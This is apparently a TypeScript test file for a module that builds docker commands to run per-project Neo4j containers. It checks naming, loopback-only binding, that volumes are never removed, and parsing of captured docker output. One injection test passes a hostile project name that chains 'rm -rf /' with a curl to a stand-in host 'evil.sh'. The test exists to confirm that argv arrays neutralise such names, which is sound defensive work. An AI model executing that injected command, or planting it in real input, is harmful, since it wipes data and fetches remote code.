import { describe, expect, it } from 'vitest'
import {
  ARGV_BUILDERS,
  CONTAINER_BOLT_PORT,
  DOCKER_NOT_AVAILABLE,
  DockerShapeError,
  LOOPBACK_HOST,
  NEO4J_IMAGE,
  containerNameFor,
  containerNameTaken,
  isRunning,
  noFreePort,
  parsePsJsonLines,
  psArgs,
  publishedBoltEndpoint,
  removeArgs,
  runArgs,
  shortContainerId,
  startArgs,
  stopArgs,
  volumeNameFor
} from './dockerCore'

/**
 * ⚠ THE FIXTURES BELOW ARE CAPTURED OUTPUT FROM THE INSTALLED docker 29.7.2,
 * NOT HAND-WRITTEN FROM DOCKER'S DOCUMENTATION. Full evidence in
 * `_verify/6a-4/d4-docker.txt`. A parser tested against invented fixtures is a
 * parser tested against the author's belief.
 */
const REAL_RUNNING_LINE =
  '{"Command":"\\"tini -g -- /startup…\\"","CreatedAt":"2026-08-16 16:36:44 -0400 EDT","HealthStatus":"none","ID":"49c3f5e9c320","Image":"neo4j:5-community","Labels":"desktop.docker.io/ports.scheme=v2","LocalVolumes":"2","Mounts":"chorus-probe-d…","Names":"chorus-probe","Networks":"bridge","Platform":{"architecture":"amd64","os":"linux"},"Ports":"127.0.0.1:7699-\\u003e7687/tcp","RunningFor":"1 second ago","Size":"36.9kB (virtual 610MB)","State":"running","Status":"Up Less than a second"}'

const REAL_EXITED_LINE =
  '{"Command":"\\"tini -g -- /startup…\\"","CreatedAt":"2026-08-16 16:36:44 -0400 EDT","HealthStatus":"none","ID":"49c3f5e9c320","Image":"neo4j:5-community","Labels":"","LocalVolumes":"2","Mounts":"chorus-probe-d…","Names":"chorus-probe","Networks":"bridge","Platform":{"architecture":"amd64","os":"linux"},"Ports":"","RunningFor":"19 seconds ago","Size":"171MB (virtual 781MB)","State":"exited","Status":"Exited (137) Less than a second ago"}'

const PROJECT_ID = 'a43b395d-51e2-47d3-8043-cb7b56094fca'

describe('container and volume naming — pure and stable', () => {
  it('is stable: the same project always resolves to the same names', () => {
    const first = containerNameFor(PROJECT_ID, 'Chorus')
    const second = containerNameFor(PROJECT_ID, 'Chorus')
    expect(first).toBe(second)
    expect(first).toBe('chorus-chorus-a43b395d')
    expect(volumeNameFor(first)).toBe('chorus-chorus-a43b395d-data')
  })

  it('⚠ two projects with the SAME display name get DIFFERENT container names', () => {
    // The failure this prevents: two projects called "api" sharing one database,
    // silently, with each believing it owns the graph.
    const a = containerNameFor('11111111-1111-1111-1111-111111111111', 'api')
    const b = containerNameFor('22222222-2222-2222-2222-222222222222', 'api')
    expect(a).not.toBe(b)
    expect(a).toBe('chorus-api-11111111')
    expect(b).toBe('chorus-api-22222222')
  })

  it.each([
    ['spaces and case', 'My Tax App', 'chorus-my-tax-app-a43b395d'],
    ['punctuation runs', 'a///b__c', 'chorus-a-b-c-a43b395d'],
    ['leading digit', '2024 Rewrite', 'chorus-2024-rewrite-a43b395d'],
    ['leading/trailing junk', '  --hello--  ', 'chorus-hello-a43b395d'],
    ['unicode only', '🎉🎉🎉', 'chorus-a43b395d'],
    ['empty', '', 'chorus-a43b395d'],
    ['punctuation only', '...', 'chorus-a43b395d']
  ])('sanitises %s into something docker accepts', (_label, input, expected) => {
    const name = containerNameFor(PROJECT_ID, input)
    expect(name).toBe(expected)
    // Docker's own rule: [a-zA-Z0-9][a-zA-Z0-9_.-]*
    expect(name).toMatch(/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/)
  })

  it('⚠ never emits an empty middle segment', () => {
    // `chorus--<id8>` is legal to docker and looks like a bug to a human.
    expect(containerNameFor(PROJECT_ID, '🎉')).not.toContain('--')
  })

  it('truncates a very long project name but stays legal and unique', () => {
    const name = containerNameFor(PROJECT_ID, 'x'.repeat(200))
    expect(name).toMatch(/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/)
    expect(name.endsWith('-a43b395d')).toBe(true)
    expect(name.length).toBeLessThan(50)
  })
})

describe('⚠ the loopback binding — the security property of this task', () => {
  it('the `-p` token contains the 127.0.0.1 literal', () => {
    const args = runArgs({ containerName: 'c', volumeName: 'v', boltPort: 7688 })
    const p = args[args.indexOf('-p') + 1]
    // Asserted as a LITERAL, not against the constant: a regression that
    // redefined LOOPBACK_HOST to '0.0.0.0' would keep a constant-based
    // assertion passing while publishing the database to the whole network.
    expect(p).toBe('127.0.0.1:7688:7687')
    expect(p.startsWith('127.0.0.1:')).toBe(true)
  })

  it('⚠ never publishes on 0.0.0.0 or a bare host:port pair', () => {
    const joined = runArgs({ containerName: 'c', volumeName: 'v', boltPort: 7688 }).join(' ')
    expect(joined).not.toContain('0.0.0.0')
    // A bare `-p 7688:7687` is the Phase 6 habit this task exists to end.
    expect(joined).not.toMatch(/-p \d+:\d+(?!\d)/)
  })

  it('publishes bolt ONLY — the Neo4j browser port is never exposed', () => {
    const args = runArgs({ containerName: 'c', volumeName: 'v', boltPort: 7688 })
    expect(args.filter((a) => a === '-p')).toHaveLength(1)
    expect(args.join(' ')).not.toContain('7474')
  })

  it('carries NEO4J_AUTH=none, a named volume, and the measured image', () => {
    const args = runArgs({ containerName: 'c', volumeName: 'v', boltPort: 7688 })
    expect(args).toEqual([
      'run',
      '-d',
      '--name',
      'c',
      '-p',
      '127.0.0.1:7688:7687',
      '-e',
      'NEO4J_AUTH=none',
      '-v',
      'v:/data',
      NEO4J_IMAGE
    ])
    expect(CONTAINER_BOLT_PORT).toBe(7687)
    expect(LOOPBACK_HOST).toBe('127.0.0.1')
  })
})

describe('⚠ F49 — nothing this module builds can destroy a graph', () => {
  it('no builder emits --rm, rm -v, or a volume+rm pair', () => {
    for (const build of ARGV_BUILDERS) {
      const args = build('chorus-probe')
      const joined = args.join(' ')
      expect(joined).not.toContain('--rm')
      expect(joined).not.toContain('volume')
      // `rm` may appear as the subcommand; what must never appear is `-v` with it.
      if (args[0] === 'rm') expect(args).not.toContain('-v')
      expect(joined).not.toMatch(/rm\s+-v/)
    }
  })

  it('remove takes the container name and nothing else', () => {
    // The one change in this task that would destroy user data silently is a
    // helpful future edit adding -v here.
    expect(removeArgs('chorus-probe')).toEqual(['rm', 'chorus-probe'])
  })

  it('there is no volume-removal builder exported at all', () => {
    // The absence IS the feature (D151): Chorus offers no path to destroy a graph.
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const mod = { runArgs, psArgs, startArgs, stopArgs, removeArgs } as Record<string, unknown>
    expect(Object.keys(mod).some((k) => /volume/i.test(k))).toBe(false)
  })
})

describe('argv builders — anchoring and shape', () => {
  it('⚠ ps anchors the name filter with ^…$', () => {
    // Unanchored, `name=chorus-api` also matches `chorus-api-2`, and the caller
    // would adopt, stop or remove the wrong container.
    expect(psArgs('chorus-api')).toEqual([
      'ps',
      '-a',
      '--filter',
      'name=^chorus-api$',
      '--format',
      '{{json .}}'
    ])
  })

  it('start and stop are the name and nothing else', () => {
    expect(startArgs('c')).toEqual(['start', 'c'])
    expect(stopArgs('c')).toEqual(['stop', 'c'])
  })

  it('⚠ a name with shell metacharacters does not change the argv SHAPE', () => {
    // A project name reaching a shell would be a command-injection site; one
    // array entry per logical argument is what makes that structurally
    // impossible. The property that catches a builder splitting on `;` or a
    // space is that the argv LENGTH is identical for a hostile name and a tame
    // one — the metacharacters ride inside entries instead of creating them.
    const evil = 'chorus-x; rm -rf / && curl evil.sh'
    for (const build of ARGV_BUILDERS) {
      const hostile = build(evil)
      const tame = build('chorusx')
      expect(hostile).toHaveLength(tame.length)
      expect(hostile.some((a) => a.includes(evil))).toBe(true)
      expect(hostile.every((a) => typeof a === 'string')).toBe(true)
    }
  })
})

describe('parsePsJsonLines — against captured docker 29.7.2 output', () => {
  it('⚠ empty output is NO SUCH CONTAINER, not an error', () => {
    expect(parsePsJsonLines('')).toEqual([])
    expect(parsePsJsonLines('\n')).toEqual([])
    expect(parsePsJsonLines('   \r\n  \n')).toEqual([])
  })

  it('reads a running container', () => {
    const [c] = parsePsJsonLines(REAL_RUNNING_LINE)
    expect(c).toEqual({
      id: '49c3f5e9c320',
      name: 'chorus-probe',
      state: 'running',
      status: 'Up Less than a second',
      ports: '127.0.0.1:7699->7687/tcp'
    })
    expect(isRunning(c)).toBe(true)
    expect(publishedBoltEndpoint(c)).toBe('127.0.0.1:7699')
  })

  it('⚠ reads an exited container, whose Ports is EMPTY', () => {
    const [c] = parsePsJsonLines(REAL_EXITED_LINE)
    expect(c.state).toBe('exited')
    expect(c.status).toBe('Exited (137) Less than a second ago')
    // Measured: docker drops the published ports once the container stops. A
    // state line interpolating this unguarded renders "published on " with
    // nothing after it.
    expect(c.ports).toBe('')
    expect(isRunning(c)).toBe(false)
    expect(publishedBoltEndpoint(c)).toBeNull()
  })

  it('⚠ tolerates Platform being an OBJECT, which docker 29.7.2 emits', () => {
    // The implementation spec typed every field as a string; the installed
    // docker disagrees, and this is the line that proves the projection copes.
    expect(REAL_RUNNING_LINE).toContain('"Platform":{')
    expect(() => parsePsJsonLines(REAL_RUNNING_LINE)).not.toThrow()
  })

  it('reads multiple lines and skips non-JSON noise', () => {
    const out = `${REAL_RUNNING_LINE}\nsome daemon warning\n${REAL_EXITED_LINE}`
    expect(parsePsJsonLines(out)).toHaveLength(2)
  })

  it('⚠ THROWS on a shape change rather than reporting "no container"', () => {
    // Silence here would make provision create a SECOND container beside the
    // running one. One legible error beats a duplicate database.
    expect(() => parsePsJsonLines('{"Id":"abc","Name":"x"}')).toThrow(DockerShapeError)
    expect(() => parsePsJsonLines('{"ID":"abc"}')).toThrow(DockerShapeError)
  })

  it('publishedBoltEndpoint returns null for an unrecognised mapping', () => {
    const [c] = parsePsJsonLines(REAL_RUNNING_LINE.replace('127.0.0.1:7699-\\u003e7687', '0.0.0.0:9-\\u003e9'))
    expect(publishedBoltEndpoint(c)).toBeNull()
  })

  it('publishedBoltEndpoint and isRunning are null-safe', () => {
    expect(publishedBoltEndpoint(null)).toBeNull()
    expect(isRunning(null)).toBe(false)
  })

  it('⚠ shortContainerId makes `run` and `ps` agree on one id format', () => {
    // Measured in one drive: `docker run` answered
    // 1d83ae50a559cf4be3dfb8bcce91a9c89d1275506ac64710cbcd5be51672c2a0 and
    // `docker ps` answered 1d83ae50a559 for the SAME container, so a created
    // container stored a long id and an adopted one stored a short id.
    const fromRun = '1d83ae50a559cf4be3dfb8bcce91a9c89d1275506ac64710cbcd5be51672c2a0'
    const fromPs = '1d83ae50a559'
    expect(shortContainerId(fromRun)).toBe(fromPs)
    expect(shortContainerId(fromPs)).toBe(fromPs)
    // `run`'s stdout carries a trailing newline.
    expect(shortContainerId(fromRun + '\n')).toBe(fromPs)
  })
})

describe('refusal sentences', () => {
  it('the docker-absent sentence names docker AND what still works', () => {
    expect(DOCKER_NOT_AVAILABLE).toContain('Docker')
    // A refusal that only says "no" reads as "the feature is broken". Memory
    // against a hand-started database is exactly what Phase 6 shipped.
    expect(DOCKER_NOT_AVAILABLE).toMatch(/start yourself|yourself/)
  })

  it('every refusal names the action and quotes no raw stderr', () => {
    const all = [
      DOCKER_NOT_AVAILABLE,
      containerNameTaken('chorus-x-1234abcd'),
      noFreePort(7688, 40)
    ]
    for (const sentence of all) {
      expect(sentence.length).toBeGreaterThan(40)
      // The mergeMcpConfig rule: a tool's message can contain anything.
      expect(sentence).not.toContain('stderr')
      expect(sentence).not.toContain('Error:')
    }
  })

  it('the name-taken sentence names the container and says what to do', () => {
    const s = containerNameTaken('chorus-api-11111111')
    expect(s).toContain('chorus-api-11111111')
    expect(s).toMatch(/provision again/)
  })

  it('the no-free-port sentence names the range it tried', () => {
    expect(noFreePort(7688, 40)).toContain('7688')
    expect(noFreePort(7688, 40)).toContain('40')
  })
})
